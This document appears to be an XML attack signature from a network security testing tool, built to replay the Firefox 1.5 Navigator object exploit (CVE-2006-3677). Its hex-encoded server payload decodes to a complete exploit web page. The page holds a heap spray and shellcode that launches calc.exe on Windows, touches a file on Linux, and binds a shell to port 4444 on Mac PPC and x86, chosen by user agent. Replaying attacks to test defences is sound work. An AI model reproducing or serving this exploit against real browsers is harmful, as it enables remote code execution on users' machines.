<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="Mozilla Navigator Java Crash"/>
    <EngDesc display="true" value="This threat sends a malicious webpage designed to cause memory corruption in the mozilla application.  By re-assigning a location to the Navigator object in firefox, when the java virtual machine is loaded it references that location and can either execute arbitrary code, or cause a crash.  Malicious webpages typically come from servers listening on port 80."/>
    <Intent display="true">
      <item value="Crashing"/>
      <item value="Buffer_Overflow"/>
      <item value="Corruption"/>
      <item value="Unauthorized_Use"/>
    </Intent>
    <Protocol display="true" value="HTTP"/>
    <Type_Of_Equipment display="true">
      <item value="Web_Browser"/>
    </Type_Of_Equipment>
    <Known_Vendors_Affected display="true">
      <item value="Mozilla"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="Mozilla_Firefox"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="Mozilla_Firefox_1.5.0.4"/>
      <item value="Mozilla_Firefox_1.5.0.3"/>
      <item value="Mozilla_Firefox_1.5.0.2"/>
      <item value="Mozilla_Firefox_1.5.0.1"/>
    </Known_Versions_Affected>
    <Credit display="true" value="http://browserfun.blogspot.com/2006/07/mobb-28-mozilla-navigator-object.html"/>
    <CVEID display="true" value="CVE-2006-3677"/>
    <bugtraqID display="true" value="19181"/>
    <OSVDB display="true" value="27559"/>
    <Author display="true" value="Chuck McAuley"/>
    <ID value="0000010cb877e41100c000a80001003c0a2bdfb8" display="true"/>
    <Revision value="1" display="true"/>
    <Safe display="true" value="true"/>
    <ServerSideAttack display="true" value="false"/>
    <SoftwareRevision display="true" value="1.4"/>
    <Suite display="true" value="Standard"/>
    <RunOnce display="false" value="false"/>
    <Valid_Traffic display="false" value="false"/>
    <AccessVector display="false" value="local"/>
    <AccessComplexity display="false" value="low"/>
    <Authentication display="false" value="not-required"/>
    <ConfImpact display="false" value="complete"/>
    <IntegImpact display="false" value="complete"/>
    <AvailImpact display="false" value="complete"/>
    <ImpactBias display="false" value="normal"/>
    <FirstAdded display="false" value=""/>
    <LastModified display="false" value="632896977287031250"/>
    <SigStyle display="false" value=""/>
    <targetNode display="false" value=""/>
    <SigProtocol display="false" value=""/>
    <Rate display="false" value=""/>
    <Regex display="false" value=""/>
    <Created value="1154146100" display="false"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="E"/>
  </Variables>
  <Loops>
    <for index="F">
      <for index="A"/>
      <for index="B"/>
      <for index="C"/>
      <for index="D"/>
      <for index="E"/>
    </for>
    <for index="G">
      <for index="A"/>
      <for index="B"/>
      <for index="C"/>
      <for index="D"/>
    </for>
  </Loops>
  <PostScript/>
  <Output index="F" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="">
      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4="">
          <HTTP Method="GET" Request-URI="/sploit.html" HTTP-Version="HTTP/1.0"/>
        </TCP>
      </IP>
    </Ethernet>
  </Output>
  <Input>
    <Ethernet/>
  </Input>
  <ServerSide display="1">
    <Output index="G" Count="">
      <Ethernet srcMac="" destMac="" pktType="">
        <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A204672692C203238204A756C20323030362031393A31383A343120474D540D0A5365727665723A204170616368652F322E302E353420284665646F7261290D0A4C6173742D4D6F6469666965643A204672692C203238204A756C20323030362031393A31373A353120474D540D0A455461673A20223164653166312D313037622D3262323733356330220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A20343231390D0A436F6E6E656374696F6E3A20636C6F73650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D5554462D380D0A0D0A3C68746D6C3E3C626F64793E3C7363726970743E0A0A2F2F204D6F42422044656D6F6E7374726174696F6E0A66756E6374696F6E2044656D6F2829207B0A0A092F2F204578706C6F697420666F7220687474703A2F2F7777772E6D6F7A696C6C612E6F72672F73656375726974792F616E6E6F756E63652F323030362F6D667361323030362D34352E68746D6C0A092F2F2068747470733A2F2F6275677A696C6C612E6D6F7A696C6C612E6F72672F73686F775F6275672E6367693F69643D3334323236370A092F2F204356452D323030362D333637370A0A092F2F20546865204A61766120706C7567696E20697320726571756972656420666F72207468697320746F20776F726B0A0A092F2F2077696E3332203D2063616C632E6578650A09766172207368656C6C636F64655F77696E3332203D20756E657363617065282725756538666325753030343425753030303025753435386225753862336325753035376325753031373825753862656625753138346625753566386225753031323025753439656225753334386225753031386225753331656525753939633025753834616325753734633025756331303725753064636125756332303125756634656225753534336225753034323425756535373525753566386225753031323425753636656225753063386225753862346225753163356625756562303125753163386225753031386225753839656225753234356325756333303425756330333125753862363425753330343025756330383525753063373825753430386225753862306325753163373025753862616425753038363825753039656225753830386225753030623025753030303025753638386225753566336325756636333125753536363025756638383925756330383325753530376225753765363825756532643825753638373325756665393825753065386125756666353725753633653725753663363125753265363325753738363525753030363527293B0A097661722066696C6C5F77696E3332203D20756E657363617065282725753038303027293B0A0976617220616464725F77696E3332203D20307830383030303830303B0A090A092F2F206C696E7578203D20746F756368202F746D702F4D45544153504C4F49542028756E72656C6961626C65290A09766172207368656C6C636F64655F6C696E7578203D20756E657363617065282725753062366125753939353825753636353225753264363825753839363325753638653725753733326625753030363825753266363825753639363225753839366525753532653325753136653825753030303025753734303025753735366625753638363325753266323025753664373425753266373025753435346425753431353425753530353325753466346325753534343925753537303025753839353325756364653125753830383027293B0A097661722066696C6C5F6C696E7578203D20756E657363617065282725756138613827293B0A0976617220616464725F6C696E7578203D202D307835383030303030303B202F2F20496E746567657220777261703A20307861383030303030300A0A092F2F206D6163206F73207820707063203D2062696E642061207368656C6C20746F20343434340A09766172207368656C6C636F64655F6D6163707063203D20756E657363617065282725753338363025753030303225753338383025753030303125753338613025753030303625753338303025753030363125753434303025753030303225753763303025753032373825753763376525753162373825753438303025753030306425753030303225753131356325753030303025753030303025753763383825753032613625753338613025753030313025753338303025753030363825753766633325756633373825753434303025753030303225753763303025753032373825753338303025753030366125753766633325756633373825753434303025753030303225753763303025753032373825753766633325756633373825753338303025753030316525753338383025753030313025753930383125756666653825753338613125756666653825753338383125756666663025753434303025753030303225753763303025753032373825753763376525753162373825753338613025753030303225753338303025753030356125753766633325756633373825753763613425753262373825753434303025753030303225753763303025753032373825753338613525756666666625753263303525756666666625753430383225756666653525753338303025753030343225753434303025753030303225753763303025753032373825753763613525753261373925753430383225756666666425753763363825753032613625753338363325753030323825753930363125756666663825753930613125756666666325753338383125756666663825753338303025753030336225753763303025753034616325753434303025753030303225753763303025753032373825753766653025753030303825753266363225753639366525753266363325753733363825753030303025753030303027293B0A097661722066696C6C5F6D6163707063203D20756E657363617065282725753063306327293B0A0976617220616464725F6D6163707063203D20307830633030303030303B0A090A092F2F206D6163206F73207820696E74656C203D2062696E642061207368656C6C20746F20343434340A092F2F205468616E6B7320746F206E656D6F5B61745D66656C696E656D656E6163652E6F726720666F72207368656C6C636F64650A092F2F205468616E6B7320746F20546F6464204D616E6E696E6720666F72207468652074617267657420696E666F726D6174696F6E20616E642074657374696E670A09766172207368656C6C636F64655F6D6163783836203D20756E657363617065282725753432366125756364353825753661383025753538363125753532393925753130363825753131303225753839356325753532653125753532343225753532343225753130366125753830636425753933393925753533353125753661353225753538363825753830636425753661623025753830636425753533353225756230353225756364316525753937383025753032366125753661353925753538356125753537353125756364353125753439383025753839306625756666663125756666666625753638353025753266326625753638373325753266363825753639363225753839366525753530653325753534353425753533353325753362623025753830636427293B0A097661722066696C6C5F6D6163783836203D20756E657363617065282725753163316327293B0A0976617220616464725F6D6163783836203D20307831633030303030303B09090A0A0A092F2F205374617274207468652062726F7773657220646574656374696F6E0A09766172207368656C6C636F64653B0A0976617220616464723B0A097661722066696C6C3B0A09766172207561203D202727202B206E6176696761746F722E757365724167656E743B0A0A096966202875612E696E6465784F6628274C696E75782069272920213D202D3129207B0A0909616C6572742827547279696E6720746F20637265617465202F746D702F4D45544153504C4F495427293B0A09097368656C6C636F6465203D207368656C6C636F64655F6C696E75783B0A090961646472203D20616464725F6C696E75783B0A090966696C6C203D2066696C6C5F6C696E75783B0A097D0A090A096966202875612E696E6465784F66282757696E646F7773272920213D202D3129207B0A0909616C6572742827547279696E6720746F206C61756E63682043616C63756C61746F7227293B090A09097368656C6C636F6465203D207368656C6C636F64655F77696E33323B0A090961646472203D20616464725F77696E33323B0A090966696C6C203D2066696C6C5F77696E33323B0A097D090A0A096966202875612E696E6465784F662827505043204D6163204F53272920213D202D3129207B0A0909616C6572742827547279696E6720746F2062696E642061207368656C6C20746F203434343427293B0A09097368656C6C636F6465203D207368656C6C636F64655F6D61637070633B0A090961646472203D20616464725F6D61637070633B0A090966696C6C203D2066696C6C5F6D61637070633B0A097D090A090A096966202875612E696E6465784F662827496E74656C204D6163204F53272920213D202D3129207B0A0909616C6572742827547279696E6720746F2062696E642061207368656C6C20746F203434343427293B0A09097368656C6C636F6465203D207368656C6C636F64655F6D61637838363B0A090961646472203D20616464725F6D61637838363B0A090966696C6C203D2066696C6C5F6D61637838363B0A097D0A0909090A096966202821207368656C6C636F646529207B0A0909616C65727428274F53206E6F7420737570706F727465642C206F6E6C7920617474656D7074696E6720612063726173682127293B0A09097368656C6C636F6465203D20756E657363617065282725756363636327293B0A090966696C6C203D20756E657363617065282725756363636327293B0A090961646472203D20307830323032303230323B0A097D0A09090A097661722062203D2066696C6C3B0A097768696C652028622E6C656E677468203C3D2030783430303030302920622B3D623B0A0A097661722063203D206E657720417272617928293B0A09666F7220287661722069203D303B20693C33363B20692B2B29207B0A0909635B695D203D200A090909622E737562737472696E6728302C20203078313030303030202D207368656C6C636F64652E6C656E67746829202B207368656C6C636F6465202B0A090909622E737562737472696E6728302C20203078313030303030202D207368656C6C636F64652E6C656E67746829202B207368656C6C636F6465202B200A090909622E737562737472696E6728302C20203078313030303030202D207368656C6C636F64652E6C656E67746829202B207368656C6C636F6465202B200A090909622E737562737472696E6728302C20203078313030303030202D207368656C6C636F64652E6C656E67746829202B207368656C6C636F64653B0A097D0A0909090A090A096966202877696E646F772E6E6176696761746F722E6A617661456E61626C656429207B0A090977696E646F772E6E6176696761746F72203D202861646472202F2032293B0A0909747279207B0A0909096A6176612E6C616E672E7265666C6563742E52756E74696D652E6E6577496E7374616E6365280A090909096A6176612E6C616E672E436C6173732E666F724E616D6528226A6176612E6C616E672E52756E74696D6522292C20300A090909293B0A090909616C6572742827506174636865642127293B0A09097D63617463682865297B0A090909616C65727428274E6F204A61766120706C7567696E20696E7374616C6C65642127293B0A09097D0A097D0A7D0A0A3C2F7363726970743E0A0A436C69636B696E672074686520627574746F6E2062656C6F77206D617920637261736820796F75722062726F77736572213C62723E3C62723E0A3C696E70757420747970653D27627574746F6E27206F6E436C69636B3D2744656D6F2829272076616C75653D2753746172742044656D6F21273E0A0A0A3C2F626F64793E3C2F68746D6C3E0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
        </IP>
      </Ethernet>
    </Output>
  </ServerSide>
</threatSignature>
